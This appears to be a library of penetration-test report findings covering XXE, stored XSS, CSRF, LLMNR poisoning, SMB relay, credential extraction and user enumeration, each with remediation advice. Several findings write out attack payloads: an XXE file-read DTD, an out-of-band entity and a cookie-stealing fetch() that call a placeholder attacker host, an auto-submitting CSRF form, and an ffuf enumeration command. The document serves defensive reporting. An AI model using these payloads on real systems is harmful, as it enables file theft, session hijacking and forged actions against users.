The endpoint `<URL>` accepts XML in the parameter `<PARAMETER_NAME>` and parses it with external entity resolution enabled. We sent a document with an internal DTD that declares a `SYSTEM` entity and references it in a field the application reflects:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<root><<FIELD_NAME>>&xxe;</<FIELD_NAME>></root>
```

The response contained the contents of `/etc/passwd`, so the parser reads local files with the privileges of the web application process. Where the response does not reflect entity content, an out-of-band entity (`<!ENTITY % ext SYSTEM "http://<ATTACKER_HOST>/x.dtd">`) caused the server to resolve our DNS name and request the DTD, which allows blind exfiltration.

Because the parser also dereferences `http://` URIs, the same flaw lets an attacker send requests from the server to internal hosts and cloud metadata services (SSRF). Entity expansion attacks such as "billion laughs" can exhaust memory and cause a denial of service.

Extensible Markup Language (XML) is a standardized markup language and file format for storing, transmitting, and reconstructing arbitrary data. 
The language encodes data in a format that is readable by both humans and machines. 
The structure of an XML document is defined in the XML standard. 
The standard provides for a concept called an entity. 
Entities provide the ability to reference content that is provided remotely by a server or resides locally on the server. 
When the XML parser evaluates the XML document, the entity it contains is replaced with the referenced value. 
Entities are defined in so-called Document Type Definitions (DTDs).

DTDs define the structure and composition of an XML document. 
They can either be completely contained in the XML document itself, so-called internal DTDs, or they can be loaded from another location, so-called external DTDs. 
A combination of both variants is also possible. 
XML External Entities (XXE) are a special form of XML entities whose contents are loaded from outside the DTD in which they are declared. 

An XXE is declared in the DTD with the SYSTEM keyword and a URI from where the content should be loaded. 
For example:

`<!DOCTYPE dtd [ <!ENTITY xxe SYSTEM "http://syslifters.com" > ]>`

The URI can also use the `file://` protocol scheme. 
Content can be loaded from local files as a result. 
For example:

`<!DOCTYPE dtd [ <!ENTITY xxe SYSTEM "file:///path/to/local/file" > ]>`

When evaluating XML documents, the XML parser replaces occurring XXEs with the contents by dereferencing the defined URIs. 
If the URI contains manipulated data, this could have serious consequences. 
An attacker can exploit this to perform server-side request forgery (SSRF) attacks and compromise the underlying server or other backend infrastructure. 
XXE injection vulnerabilities can also be exploited to cause service/application downtime (denial of service) or expose sensitive data such as local system files.
data.recommendation:
* The XML parser should be configured to use a local static DTD and not allow external DTDs declared in the XML document.
* We recommend limiting the functions of the XML parsing library to the minimum needed (see the documentation of the library used).
* User input should be validated before parsing if possible.
* Detailed information and help on preventing XXE injections can be found in the linked XML External Entity Prevention Cheat Sheet from OWASP.
data.short_recommendation: Disable support for external DTDs in the XML parsing library.

data.title: LLMNR and NBT-NS Poisoning Leading to Credential Capture
data.summary:
Legacy broadcast name resolution protocols were enabled across the internal
network, allowing an attacker to impersonate requested hosts and capture
authentication material from users and systems.
data.description:
Link-Local Multicast Name Resolution (LLMNR) and NetBIOS Name Service (NBT-NS)
were enabled on hosts within the internal network. When DNS resolution fails,
Windows falls back to these protocols and broadcasts the requested name to the
local segment.

Because these broadcasts are unauthenticated, any host on the segment may respond
claiming to be the requested resource. The victim then attempts to authenticate
to the attacker-controlled host, disclosing its NetNTLM challenge-response
material. This material can be cracked offline or relayed directly to other
systems where SMB signing is not enforced.
data.impact:
An attacker with access to the internal network could passively collect
authentication material from users and service accounts without interacting with
them directly. Weak passwords can be recovered offline within minutes, and the
captured material can be relayed to other hosts, providing an initial foothold
and a route to privilege escalation across the domain.
data.recommendation:
1. Disable LLMNR through Group Policy:
   Computer Configuration > Administrative Templates > Network > DNS Client >
   "Turn off multicast name resolution" = Enabled

2. Disable NBT-NS on all network adapters, either via DHCP option 001 set to 0x2
   or through scripted registry configuration of NetbiosOptions.

3. Ensure DNS is correctly configured so that legitimate name resolution does not
   fail and fall back to broadcast protocols.

4. Enforce SMB and LDAP signing so that any material captured cannot be relayed
   (see the related finding).

5. Monitor for hosts responding to name resolution broadcasts, which is a
   reliable indicator of an active poisoning attack.

data.title: Stored Cross-Site Scripting (XSS)
data.summary:
At the time of testing, the web application stored user input unchecked and later included it in HTTP responses in an insecure manner. 
It was thus vulnerable to stored cross-site scripting (XSS) attacks.  
Exploitation of Stored XSS vulnerabilities does not require user interaction, making them more dangerous than Reflected XSS vulnerabilities.
data.description:
We were able to identify a stored XSS vulnerability in the web application during testing. 
Due to incorrect validation and encoding of data, we were able to inject malicious scripts into the web application and store them persistently.

The parameter `<PARAMETER_NAME>` in `<URL>` is stored by the application and rendered on `<OUTPUT_URL>` without output encoding. We submitted the following payload and confirmed that the script executed each time the page was loaded, including by a second user account:

```html
<script>alert(document.domain)</script>
```

Because the payload persists server-side, a victim only has to open the affected page. No crafted link is needed. In the context of the victim's session, injected JavaScript can read the DOM, send authenticated requests, and exfiltrate data to an attacker-controlled host, for example `fetch('https://<ATTACKER_HOST>/?c='+document.cookie)`. Session cookies without the `HttpOnly` flag are directly readable. When a privileged user views the page, the script can also perform administrative actions.

Cross-site scripting (XSS) is a common web security vulnerability where malicious scripts can be injected into web applications due to insufficient validation or encoding of data. 
In XSS attacks, attackers embed JavaScript code in the content delivered by the vulnerable web application.

The goal in stored XSS attacks is to place script code on pages visited by other users. 
Simply visiting the affected subpage is enough for the script code to be executed in the victim's web browser. 

For an attack, malicious scripts are injected into the web application by the attacker and stored and included in subsequent HTTP responses of the application. 
The malicious script is ultimately executed in the victim's web browser and can potentially access cookies, session tokens or other sensitive information. 

If the attack is successful, an attacker gains control over web application functions and data in the victim's context. 
If the affected user has privileged access, an attacker may be able to gain complete control over the web application.
data.recommendation:
* Ensure that all processed data is filtered as rigorously as possible. Filtering and validation should be done based on expected and valid inputs.
* Data should be encoded before the web application includes it in HTTP responses. Encoding should be done contextually, that is, depending on where the web application inserts data in the HTML document, the appropriate encoding syntax must be considered.
* The HTTP headers `Content-Type` (e.g. `text/plain`) and `X-Content-Type-Options: nosniff` can be set for HTTP responses that do not contain HTML and JavaScript. 
* We recommend to additionally use a Content Security Policy (CSP) to control which client-side scripts are allowed and which are forbidden.
* Detailed information and help on preventing XSS can be found in the linked Cross-Site Scripting Prevention Cheat Sheet from OWASP.
data.short_recommendation: User input should be validated and filtered based on expected or valid input. It should be ensured that data is properly encoded contextually before it is included in HTTP responses.

data.title: Insecure Direct Object Reference
data.summary:
The application referenced records by identifiers supplied in the request without
verifying that the authenticated user was entitled to access them, allowing any
user to retrieve and modify other users' data.
data.description:
The application identified records through values carried in the request, such as
a numeric record identifier in a URL path or a query parameter. Authentication
was enforced correctly, but no authorisation check was performed to confirm that
the record requested belonged to the authenticated user or fell within the scope
of their role.

As a result, any authenticated user could access any record simply by altering
the identifier. Where identifiers were sequential, the full data set could be
enumerated by incrementing the value; where they were less predictable, they
remained retrievable from other parts of the application that disclosed them
legitimately.

The same weakness applied to operations that modify state. Requests to update or
delete a record succeeded regardless of ownership, extending the impact beyond
disclosure to unauthorised modification.

Controls that conceal the affected functionality from the user interface provide
no protection, as the request is constructed directly rather than through the
interface.
data.impact:
Any authenticated user could retrieve, modify, or delete records belonging to
other users, including data classed as sensitive. Because the records are
enumerable, an attacker holding a single valid account could extract the
application's entire data set, and the ability to modify records without
authorisation undermines the integrity of the data the business relies upon.
data.recommendation:
1. Enforce an authorisation check on every request that references a record,
   verifying against the authenticated session that the user is entitled to the
   specific record and the specific operation requested.

2. Implement the check server side within the data access layer, so that it
   applies uniformly and cannot be omitted when new endpoints are added.

3. Scope queries to the authenticated user where the business model permits,
   retrieving records by owner and identifier together rather than by identifier
   alone, so that an unauthorised request returns nothing.

4. Replace sequential identifiers with values that cannot be guessed, as a
   defence-in-depth measure. This raises the effort required for enumeration but
   does not substitute for the authorisation check.

5. Include authorisation testing in the development process, covering each
   endpoint with a request issued by a user who should not have access.

data.title: SMB Message Signing Not Required
data.summary:
SMB message signing was not enforced across the internal network, allowing
authentication attempts to be relayed to other systems and used to gain
administrative access without knowledge of any password.
data.description:
SMB message signing was not required on the majority of in-scope hosts. Without
enforced signing, an attacker positioned on the network can intercept NTLM
authentication attempts and relay them to a third-party host, authenticating as
the victim user without ever recovering or cracking their password.

This condition is typically combined with name resolution poisoning to coerce
authentication from users and systems on the same broadcast domain. No credential
material is required, and the attack produces no failed authentication events on
the targeted account.
data.impact:
An attacker with access to the internal network could authenticate to systems as
a privileged user without knowledge of any credentials. Where a relayed account
holds local administrator rights on the target, this grants remote code execution
and enables the extraction of further credential material from memory, providing
a route to wider network compromise.
data.recommendation:
1. Enforce SMB signing on all servers and workstations through Group Policy:
   "Microsoft network server: Digitally sign communications (always)" = Enabled
   "Microsoft network client: Digitally sign communications (always)" = Enabled

2. Enforce LDAP signing and LDAP channel binding on all domain controllers to
   prevent relay against directory services.

3. Disable LLMNR and NBT-NS to remove the primary mechanism used to coerce
   authentication (see the related finding on name resolution poisoning).

4. Restrict NTLM authentication using the "Network security: Restrict NTLM"
   policy settings, and migrate services to Kerberos authentication.

5. Apply changes in a phased manner with monitoring, as enforcing signing can
   affect legacy applications and non-Windows SMB clients.

data.title: Insecure Protocols in Use
data.summary:
Services transmitting credentials and data without encryption were in use across
the internal network, allowing an attacker with network access to intercept
authentication material and application content.
data.description:
Services were identified transmitting data without encryption, including file
transfer, remote administration, directory, and web services. Protocols of this
type carry credentials and application data in a form directly readable by any
party able to observe the traffic.

Interception does not require a privileged network position. Techniques such as
name resolution poisoning and address resolution protocol spoofing allow an
attacker on the same segment to place themselves in the path of traffic between
two hosts, at which point cleartext content can be recorded in full.

The absence of encryption additionally removes any assurance of integrity.
Traffic can be modified in transit as well as observed, permitting responses to
be altered and content to be injected into sessions.

Legacy protocol versions were also observed, including SMB version 1, which
carries known vulnerabilities and lacks the protections present in later
revisions. Support for these versions is retained for compatibility with systems
that in many cases no longer exist in the environment.
data.impact:
An attacker with access to the internal network could recover credentials and
sensitive data from intercepted traffic without exploiting any software
vulnerability. Credentials obtained this way are frequently valid for other
systems, providing a route to lateral movement, and the ability to modify traffic
in transit permits content to be injected into otherwise legitimate sessions.
data.recommendation:
1. Migrate all affected services to encrypted equivalents: SFTP or FTPS in place
   of FTP, SSH in place of Telnet, HTTPS in place of HTTP, and LDAPS or LDAP with
   StartTLS in place of unencrypted directory access.

2. Disable the legacy protocol versions entirely once migration is complete,
   rather than permitting them alongside their replacements, as clients will
   otherwise continue to negotiate the weaker option.

3. Remove SMB version 1 from all systems through Group Policy or the relevant
   feature management interface.

4. Enforce encryption at the server so that unencrypted connections are refused
   rather than accepted as a fallback.

5. Identify systems that genuinely require legacy protocol support, and where any
   remain, isolate them at the network level and document the exception with a
   review date.

6. Monitor the network for cleartext authentication, which provides both a
   verification that remediation is complete and detection of services
   reintroduced later.

data.title: Credential Extraction from Compromised Hosts
data.summary: Administrative access to compromised hosts was used to extract password hashes, Kerberos tickets, and cached credentials from the operating system, enabling further lateral movement and privilege escalation.
data.description:
When an attacker gains administrative access to a Windows host, several sources of credential material become accessible.

The LSASS process holds NTLM password hashes and Kerberos tickets for every user with an active or recent interactive session. Extracting this data yields the authentication material needed to impersonate those users on other systems.

The local Security Account Manager (SAM) database stores NTLM hashes for all local accounts. These hashes can be used for pass-the-hash attacks, and where local administrator passwords are shared across hosts, a single extraction compromises the entire group.

The DPAPI master keys on each host protect saved credentials in Windows Credential Manager, browser passwords stored by Chrome and Edge, and certificate private keys. With administrative access, these keys can be decrypted and the protected secrets recovered.

On domain controllers, the NTDS.dit database contains the NTLM hash and Kerberos keys for every account in the domain. Access to this file, whether through volume shadow copy or the DCSync technique, is equivalent to compromise of every domain account.

Credential material was extracted during this assessment from multiple hosts. The recovered hashes and tickets were used to authenticate to additional systems and escalate privileges within the domain.
data.impact: Each compromised host yielded credentials for accounts that had authenticated to it, including in several cases domain administrative accounts. This created a cascading chain where each new host provided access to further systems. The credentials recovered included those of service accounts, administrative users, and in one case the domain administrator, leading to full domain compromise.
data.recommendation:
1. Enable Credential Guard on all supported systems to isolate LSASS process memory, preventing extraction of NTLM hashes and Kerberos tickets by tools running as administrator.

2. Implement a tiered administration model so that privileged accounts authenticate only to systems of equivalent sensitivity. A domain administrator account should never log on to a workstation.

3. Configure the "Interactive logon: Number of previous logons to cache" policy to the minimum value the business requires, reducing the window during which cached credentials remain on disk.

4. Deploy Windows LAPS to assign unique local administrator passwords per host, so that extraction of the SAM database on one host does not grant access to others.

5. Monitor for access to the LSASS process by unexpected executables, and for volume shadow copy creation on domain controllers outside maintenance windows.

6. Restrict debug privileges (SeDebugPrivilege) through Group Policy to prevent non-administrative processes from reading LSASS memory.

data.title: Excessive Permissions on Network File Shares
data.summary:
Network file shares granted read or write access to all authenticated users,
exposing sensitive business data and credential material to any account in the
domain.
data.description:
Multiple file shares were configured with share or NTFS permissions granting
access to broad principals such as Everyone, Authenticated Users, or Domain
Users. The content held on these shares included business documentation, system
backups, deployment scripts, and application configuration files.

Access of this type requires no exploitation. An attacker holding any valid domain
account can enumerate available shares and recursively search their contents for
material of interest, an activity that generates ordinary file access events and
is therefore difficult to distinguish from legitimate use.

Where write access was also granted, the exposure extends beyond disclosure. An
attacker able to modify scripts or place files in locations from which they are
later executed obtains code execution in the context of whichever user or
scheduled process runs them, frequently a privileged account.

Permissions of this kind commonly originate as temporary grants made to resolve
an access problem, and remain in place indefinitely because no review process
exists to remove them.
data.impact:
Any authenticated domain user could access sensitive business information without
authorisation. Where credential material was present, this directly enabled
privilege escalation and lateral movement. Where write access was granted, an
attacker could modify executable content and obtain code execution in the context
of other users, including administrative accounts.
data.recommendation:
1. Review share and NTFS permissions across all file servers and remove access
   granted to Everyone, Authenticated Users, and Domain Users.

2. Grant access through purpose-specific security groups aligned to business
   function, applying the principle of least privilege.

3. Ensure share-level and NTFS-level permissions are consistent. The more
   restrictive of the two applies, and misalignment between them frequently
   conceals excessive access from administrative review.

4. Relocate sensitive content that does not belong on general-purpose shares,
   particularly backups, scripts, and configuration files containing credentials,
   to storage with appropriate access control.

5. Implement recurring automated scanning of accessible shares for credential
   patterns and sensitive data, so that material reintroduced after remediation
   is identified promptly.

6. Establish a periodic access review so that permissions granted for temporary
   business needs are revoked when no longer required.

data.title: Sensitive Information Stored in Active Directory Object Attributes
data.summary:
Account passwords and other sensitive information were stored in Active Directory
attributes that are readable by every authenticated user in the domain.
data.description:
Active Directory objects carry a number of descriptive attributes, including
description, info, comment, and userPassword. By default these attributes are
readable by any authenticated principal in the domain, as they are intended to
hold operational information rather than secrets.

Administrators frequently record credentials in these fields for convenience,
particularly for service accounts and accounts used by legacy applications, on
the assumption that the directory itself constitutes a protected store. The
information persists indefinitely and is not subject to the password policy,
rotation schedule, or auditing applied to the credential it describes.

Retrieval requires nothing more than a standard LDAP query using any valid domain
account. The query is indistinguishable from ordinary directory enumeration
performed by legitimate applications, so the activity is unlikely to be detected.

Attributes containing credential material were identified within the environment.
data.impact:
Any authenticated domain user could retrieve credentials for other accounts
through a single directory query requiring no elevated privileges and no
exploitation. Where the exposed accounts hold administrative or service
privileges, this provides a direct route to privilege escalation and lateral
movement across the environment.
data.recommendation:
1. Remove all credential material and other sensitive information from directory
   object attributes, and rotate every credential identified as exposed.

2. Review the accounts concerned for evidence of unauthorised use, as the exposure
   may predate this assessment by a considerable period.

3. Store operational secrets in a dedicated credential management solution with
   access control and audit logging, rather than in the directory.

4. Restrict read access to descriptive attributes where the business does not
   require them to be globally readable, applying directory permissions at the
   organisational unit level.

5. Establish a recurring automated audit of directory attributes for credential
   patterns, as the practice tends to recur once established within an
   administrative team.

data.title: Insecure HTTP cookies
data.summary:
The issued HTTP cookies of the web application did not have the _HttpOnly_ and/or the _Secure_ cookie attribute set. 
If the _HttpOnly_ attribute is not set, the affected cookie can be read or modified client-side using JavaScript. 
If the _Secure_ attribute is not set, browsers also send the cookie over unencrypted HTTP connections. 
Insecurely configured cookies such as session cookies expand the potential attack surface of a web application. 
They make it easier for an attacker to exploit client-side vulnerabilities such as cross-site scripting (XSS) or compromise sessions by trivially intercepting cookies.
data.description:
HTTP is a stateless protocol, which means that it cannot distinguish requests from different users without an additional mechanism. 
To address this problem, it requires a session mechanism. 
The most commonly used mechanism for managing HTTP sessions in browsers is cookie storage. 
An HTTP cookie is a small record that a server sends to a user's web browser. 
The browser can store the cookie and send it back to the same server for subsequent requests. 
This can be used to implement sessions for the stateless HTTP protocol. 
An HTTP cookie can be used to distinguish requests from different users and to keep users logged in. 

Cookies thus represent a frequent target for attackers. 
A web application should therefore harden the configuration of all sensitive cookies. 
This can be achieved by setting the _Secure_ and _HttpOnly_ cookie attributes. 
A cookie with the _Secure_ attribute will only be sent to the server over HTTPS connections and never over an unsecured HTTP connection. 
A cookie with the _HttpOnly_ attribute set is inaccessible to JavaScript and thus helps mitigate cross-site scripting (XSS) attacks. 
If an attacker is able to tap sensitive cookies such as session cookies, the attacker could take over user accounts and perform actions in the context of affected users. 
An attacker may also be able to gain complete control over all web application functions and data if they take over a user account with privileged access.

We reviewed the set attributes of sensitive HTTP cookies of the web application. The following table provides an overview of the set attributes:

| Cookie | Secure | HttpOnly |
|:---:|:---:|:---:|
| TODO | - | - |
data.recommendation:
* Set the _Secure_ attribute for sensitive cookies. This attribute instructs a browser to send the cookie only over an encrypted HTTPS connection to prevent session ID disclosure through man-in-the-middle attacks.
* If possible, also set the _HttpOnly_ attribute for sensitive cookies. This attribute prevents the cookie from being accessed client-side via JavaScript. This can make session hijacking by XSS attacks more difficult.
data.short_recommendation: Make sure that the configuration of all sensitive cookies is hardened and thus important cookie attributes like HttpOnly or Secure are set.

data.title: Cross-Site Request Forgery (CSRF)
data.summary:
The web application was vulnerable to Cross-Site Request Forgery (CSRF). 
CSRF is an attack that causes users to unknowingly send an HTTP request to a web application to which they are currently authenticated. 
Attackers can thereby partially bypass a web browser's same-origin policy and perform state-changing actions in the context of an affected user. 
Depending on the nature of the action, the attacker can gain complete control over the user's account. 
If the user account is administrative, CSRF may also be able to compromise the entire web application.
data.description:
We identified a CSRF vulnerability in the web application, allowing an attacker to perform actions in the context of another user.

The function `<FUNCTION_NAME>` at `<URL>` changes application state through a `<METHOD>` request. The request carries no anti-CSRF token, and the application does not check the `Origin` or `Referer` header. Authentication relies solely on the session cookie, which the browser attaches to cross-site requests (`SameSite` is not set or is `None`).

We reproduced the attack with the following page hosted on a different origin. When a logged-in user opens it, the browser submits the request with the victim's cookie and the application executes the action:

```html
<form action="<URL>" method="POST" id="csrf">
  <input type="hidden" name="<PARAMETER_NAME>" value="<VALUE>">
</form>
<script>document.getElementById('csrf').submit();</script>
```

The server processed the forged request and returned `<RESULT>`. The request contains no value the attacker cannot predict, so exploitation requires only that the victim visits an attacker-controlled page while logged in.

Cross-site request forgery (CSRF) is a web security vulnerability in which an attacker can trick an authenticated user into unknowingly sending a state-changing HTTP request to the vulnerable web application. 
In CSRF, an attacker assumes the victim's identity and access privileges to perform unwanted actions (e.g., change email address) on their behalf. 
Without appropriate CSRF protection, the web application has no way to distinguish between a request prepared by the attacker and a legitimate request from the victim.

Several prerequisites must be in place for a CSRF attack to take place. 
First, there must be an action in the web application that is relevant to an attacker and makes sense to exploit. 
For example, this could be a privileged action, such as changing a user's access permissions or changing a password. 
Another requirement is that there is no other mechanism besides cookie-based authentication to distinguish HTTP requests from different users. 
If the user is authenticated and thus has a valid session cookie, the web application thus has no way to distinguish between a malicious, subverted request from the attacker and a legitimate request from the victim. 
Last, it must be ensured that actions do not require specific parameters whose values an attacker cannot determine or predict. 
For example, if a user is asked to change his password, the function is not vulnerable if an attacker needs to know the value of the existing password.

A common way to exploit CSRF vulnerabilities is through phishing emails. 
An attacker does this by preparing malicious links with the intention of foisting a state-changing request on the victim. 
The attacker then distributes the malicious links to victims via email. 
When a user opens the link in a web browser and is authenticated to it, the request is sent to the vulnerable web application. 
If successful, the attack causes an action with the victim's identity and privilege level.
data.recommendation:
* Check if the framework has built-in CSRF protection and use it. If not, ensure that all state-changing requests contain a randomly generated CSRF token with high entropy. Also ensure that CSRF tokens are properly validated on the backend.
* Consider various additional security measures:
    * For example, set the SameSite attribute for session cookies. Web browsers decide whether to include cookies in cross-site requests based on this attribute.
    * Use Custom Request Headers. By default, the browser's same-origin policy restricts JavaScript from submitting cross-site requests with custom request headers.
    * For highly sensitive actions, user interactions such as CAPTCHAs, one-time tokens, re-authentication, etc. can also be considered as additional CSRF protection. 
* Detailed information and assistance on how to prevent CSRF vulnerabilities can be found in the linked Cross-Site Request Forgery Cheat Sheet from OWASP.
data.short_recommendation: Make sure that randomly generated CSRF tokens with high entropy are included in all state-changing HTTP requests and validated in the backend.

data.title: Disclosure of sensitive data in URL parameters
data.summary:
The web application sent sensitive data as URL parameters in HTTP requests. 
Data sent as URL parameters is stored in the browser cache and can potentially appear in various other places such as web server logs, referer headers or shared systems. 
Third parties could thus gain access to this sensitive data.
data.description:
The application sends sensitive data in the URL parameter `<PARAMETER_NAME>` at `<URL>`. The request below transmits `<SENSITIVE_DATA>` in the query string:

```http
GET <URL>?<PARAMETER_NAME>=<VALUE> HTTP/1.1
Host: <HOST>
```

URLs are not treated as confidential. Browsers store them in history, proxies and web servers write them to access logs, and the browser sends them in the `Referer` header when the user follows a link to another site or the page loads external resources. Anyone with access to one of these locations can read the value.

This could expose the data in the following places:
* Referer Header
* Web Logs
* Shared Systems
* Browser History
* Browser Cache
* Shoulder Surfing
data.recommendation:
* The application should send all sensitive data in the body of an HTTP message, e.g. in the body of a POST request.
* Protect the transmission with HTTPS.
data.short_recommendation: To protect sensitive data from access by third parties, it should be sent in the body of an HTTP message, e.g. via POST request.

data.title: Incorrectly configured HTTP security headers
data.summary:
The web application did not have important HTTP security headers set or they were configured insecurely. 
HTTP security headers are a good way to increase the security of a web application. 
They can help make vulnerabilities such as cross-site scripting, clickjacking, information disclosure, and others more difficult or even prevent them altogether. 
Without proper HTTP security headers, the potential attack surface of a web application is larger and makes it easier for an attacker to exploit client-side vulnerabilities.
data.description:
We checked the HTTP security headers of the examined web application. 
The following table provides an overview of which headers were set correctly and which were not:

| Host | Content-Security Policy (CSP) | Referrer-Policy | HTTP-Strict-Transport-Security (HSTS) | X-Content-Type-Options | X-Frame-Options | Permissions-Policy | X-XSS-Protection |
|:---:|:---:|:---:|:---:|:---:|:---:|:---:|:---:|
| TODO | - | - | - | - | - | - | - |

Modern browsers support several HTTP security headers that can increase the security of web applications against client-side vulnerabilities such as clickjacking, cross-site scripting, and other common attacks. 
HTTP Security headers are response headers that specify whether and which security measures should be enabled or disabled in the web browser. 
These HTTP headers are exchanged between a browser and a server and specify the security-related details of HTTP communication. 
Below is a brief description and overview of the most important current HTTP security headers:

* **Content Security Policy**.
The Content Security Policy (CSP) HTTP header allows fine-grained control over what resources a browser is allowed to obtain. 
The CSP header is a very effective measure to prevent the exploitation of cross-site scripting (XSS) vulnerabilities.

* **Referrer Policy**.
The `Referrer-Policy` header determines how and when browsers transmit the HTTP Referer (sic) header. 
In the Referer header, a browser informs a target page about the origin of an HTTP request, for example, when a user navigates to a specific page via a link or loads an external resource.

* **HTTP Strict Transport Security (HSTS)**.
With the HSTS header, a web page instructs the browser to connect only over HTTPS. 
All unencrypted HTTP requests are transparently redirected in the process. 
TLS and certificate-related errors are also handled more strictly by preventing users from bypassing the error page.

* **X-Content-Type-Options**.
The `X-Content-Type-Options` header specifies that browsers will only load scripts and stylesheets if the server specifies the correct MIME type. 
Without this header, there is a risk of MIME sniffing. 
This means that browsers will misrecognize files as scripts and stylesheets, which could lead to XSS attacks.

* **X-Frame-Options**
`X-Frame-Options` are used to determine if and in which form the web page can be embedded in an iframe. 
Clickjacking is a viable attack that can exploit such embedding in an `iframe`. 
In such an attack, an attacker overlays the rendering of a legitimate page to then cause users to perform seemingly innocuous interactions (e.g., mouse clicks and/or keystrokes).

* **Permissions policy**
Permissions policy allows web developers to selectively enable, disable, and modify the behavior of certain features and APIs in the browser. 
`Permissions-Policy` is similar to Content Security Policy, but controls specific functions of the browser rather than security behavior.

* **X-XSS-Protection**
`X-XSS-Protection` is a feature that prevents pages from loading when a browser detects Reflected Cross-Site Scripting (XSS) attacks. 
This header is obsolete when using modern browsers, provided that a secure content security policy has been defined.
data.recommendation:
* Do not allow the web page to be included in a frame. Set `X-Frame-Options: DENY` for this. Alternatively you can restrict this setting to the same-origin with `X-Frame-Options: SAMEORIGIN`.
* Set the header `X-XSS-Protection` explicitly with `X-XSS-Protection: 1; mode=block`.
* Prevent the browser from guessing the MIME type based on the content of the resource. Set the `X-Content-Type-Options` header with the `nosniff` option.
* Restrict the `referrer policy` to prevent potentially sensitive information from being exposed to third party sites. You should define the header as follows: `Referrer-Policy: strict-origin-when-cross-origin`.
* Configure the `Strict-Transport-Security` header so that your web application can only be accessed over a secured HTTPS connection. You should set the header like this: `Strict-Transport-Security: max-age=63072000; includeSubDomains; preload`.
* If possible, define a Content Security Policy (CSP) for your web application. CSP is an additional security measure that can make it much more difficult to exploit client-side vulnerabilities. Details on how to configure it securely can be found in the resources.
* Restrict the use of sensitive browser features such as the camera, microphone or speaker using 'Permissions Policy' headers.
data.short_recommendation: Follow best practices recommendations for configuring HTTP security headers and implement them for your web application if possible.

data.title: Insufficient Logging and Monitoring
data.summary:
Activity conducted throughout this assessment produced no detectable response,
indicating that logging and monitoring were insufficient to identify an attack in
progress.
data.description:
The assessment was conducted without any attempt to evade detection. Network
enumeration, credential attacks, lateral movement, and privilege escalation were
performed using standard tooling and default configurations, over a period of
several days.

At no point was any activity queried, blocked, or escalated. No contact was made
with the testing team regarding the traffic observed, and no account used during
the assessment was disabled or investigated.

Several categories of activity conducted would ordinarily generate events
suitable for detection, including authentication failures across multiple
accounts, requests for Kerberos service tickets using legacy encryption,
administrative authentication from unusual sources, and access to directory
objects associated with privilege escalation. The absence of any response
indicates either that these events are not being collected, that they are
collected but not analysed, or that alerting exists but does not reach a party
able to act on it.

Detection capability is a distinct control from prevention. The weaknesses
documented elsewhere in this report describe how an attacker gains access; this
finding describes why that access would continue undetected.
data.impact:
An attacker operating within the environment would be unlikely to be detected,
allowing the time between initial compromise and discovery to extend
indefinitely. This period determines the extent of the damage that can be caused,
as it governs how much data can be removed, how many systems can be reached, and
how thoroughly persistence can be established before any response begins.
Insufficient logging additionally impairs investigation after the event, as the
records required to establish what occurred are not available.
data.recommendation:
1. Collect security event logs centrally from all domain controllers, servers,
   workstations, and network infrastructure, retaining them for a period
   sufficient to support investigation of an intrusion discovered late.

2. Forward logs to a system outside the monitored environment, so that an
   attacker holding administrative access to a host cannot alter the record of
   their activity.

3. Implement detection rules for the activity classes identified during this
   assessment, including authentication failures aggregated across accounts,
   Kerberos ticket requests using legacy encryption, and modification of
   privileged group membership and directory object permissions.

4. Deploy endpoint detection capable of identifying credential access and
   suspicious process behaviour, which produces signals unavailable from
   operating system logs alone.

5. Define and document a response process specifying who receives alerts, within
   what timeframe they are triaged, and what authority they hold to act.

6. Validate detection capability periodically through structured testing, so that
   coverage gaps are identified deliberately rather than during an incident.

data.title: Anonymous Enumeration of Domain Information Permitted
data.summary:
Domain infrastructure permitted unauthenticated users to enumerate account names,
group membership, and password policy, providing an attacker with the information
required to plan credential attacks.
data.description:
Windows systems support session establishment without credentials, historically
required for interoperability with legacy clients. Where this is permitted,
an unauthenticated party can query the target for information about the domain it
belongs to.

Enumeration of this type returned the full list of domain user accounts, group
membership, the password policy in force, and the account lockout threshold. LDAP
services on the domain controllers additionally responded to anonymous binds,
returning equivalent directory content.

None of this constitutes a compromise in itself. Its significance lies in what it
enables: a valid list of account names removes the guesswork from password
spraying, and knowledge of the lockout threshold allows an attacker to calibrate
attempts so that no account is locked and no alert is raised. The password policy
reveals the minimum length, allowing candidate passwords that would certainly fail
to be discarded in advance.

Anonymous enumeration was successful against domain infrastructure during this
assessment.
data.impact:
An attacker with network access and no credentials could obtain a complete
inventory of domain accounts and the constraints governing authentication. This
materially increases the likelihood that a subsequent password attack succeeds
while remaining undetected, and reduces the effort required to identify
high-value targets such as service and administrative accounts.
data.recommendation:
1. Set "Network access: Do not allow anonymous enumeration of SAM accounts and
   shares" to Enabled through Group Policy on all systems.

2. Set the RestrictAnonymous and RestrictAnonymousSAM registry values to restrict
   session establishment without credentials.

3. Disable anonymous LDAP binds on all domain controllers so that directory
   queries require authentication.

4. Remove any legacy accounts or applications that depend on anonymous access,
   replacing them with authenticated service accounts holding the minimum
   privileges required.

5. Restrict SMB and LDAP access at the network level so that these services are
   reachable only from systems that require them.

6. Apply changes in a controlled manner with monitoring, as legacy applications
   and non-Windows systems occasionally depend on the behaviour being removed.

data.title: User Enumeration
data.summary:
The web application was vulnerable to a user enumeration vulnerability. 
User enumeration is a common vulnerability in web applications that occurs when an attacker can use brute force techniques to determine valid user accounts in a system. 
Although user enumeration is a low risk in itself, it still provides an attacker with valuable information for follow-up attacks such as in brute force and credential stuffing attacks or in social engineering campaigns.
data.description:
We were able to identify a user enumeration vulnerability in the web application, allowing us to determine valid user accounts using brute force techniques.

The endpoint `<ENDPOINT>` at `<URL>` responds differently for existing and non-existing accounts. For a valid username the application returns `<VALID_RESPONSE>`. For an unknown username it returns `<INVALID_RESPONSE>`. The difference appears in the response body, status code, response length, or response time.

We automated the check with a username wordlist (for example with `ffuf` or Burp Intruder), filtered on the differing response, and identified `<NUMBER>` valid accounts, including `<EXAMPLE_ACCOUNT>`:

```bash
ffuf -u <URL> -X POST -d 'username=FUZZ&password=x' -w <WORDLIST> -fr '<INVALID_RESPONSE>'
```

The application did not rate limit or block our requests during enumeration, so an attacker can test large lists of usernames quickly.

Often, as a result of a faulty configuration or design decision, web applications indicate when a user already exists in the system. 
Two of the most common areas where this occurs are the login page or the "forgot password" feature of a web application. 
One example is when a user enters incorrect credentials, they receive information that the password they entered was incorrect. 
The information obtained can now be used by an attacker to determine whether or not a particular username already exists. 
By trial and error, an attacker can use it to determine a list of valid usernames. 

Once an attacker has such a list, they can address these user accounts in new attacks to obtain valid credentials. 
